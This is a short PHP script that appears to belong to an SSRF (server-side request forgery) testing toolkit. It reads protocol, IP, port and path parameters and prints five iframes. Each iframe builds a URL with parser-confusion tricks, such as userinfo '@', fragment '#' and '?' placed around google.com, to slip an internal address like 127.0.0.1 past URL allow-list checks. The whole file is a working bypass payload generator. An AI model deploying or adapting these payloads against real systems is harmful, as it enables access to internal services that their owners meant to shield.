<?php
#http://ssrf.localdomain.pw/iframe/?proto=http&ip=127.0.0.1&port=80&url=/
header("Content-Type: text/html");
header("Cache-Control: max-age=0, must-revalidate, no-cache, no-store, private");
header("Pragma: no-cache");

if (filter_var($_GET["ip"], FILTER_VALIDATE_IP) && filter_var($_GET["port"], FILTER_VALIDATE_INT) && isset($_GET["proto"]) && isset($_GET["url"])){
    $proto = urlencode($_GET["proto"]);
    $url = htmlentities(($_GET["url"]), ENT_COMPAT, 'UTF-8');
    echo '<html><body>';
    echo '<iframe src="'.$proto.'://google.com:80+&@'.$_GET["ip"].':'.$_GET["port"].$url.'#+@google.com:80/" height="180px" width="80%"></iframe>';
    echo '<iframe src="'.$proto.'://'.$_GET["ip"].':'.$_GET["port"].$url.'+&@google.com:80#+@google.com:80/" height="180px" width="80%"></iframe>';
    echo '<iframe src="'.$proto.'://google.com:80+&@google.com:80#+@'.$_GET["ip"].':'.$_GET["port"].$url.'" height="180px" width="80%"></iframe>';
    echo '<iframe src="'.$proto.'://'.$_GET["ip"].':'.$_GET["port"].$url.'?@google.com:80/" height="180px" width="80%"></iframe>';
    echo '<iframe src="'.$proto.'://'.$_GET["ip"].':'.$_GET["port"].$url.'#@www.google.com:80/" height="180px" width="80%"></iframe>';
    echo '</body></html>';
}
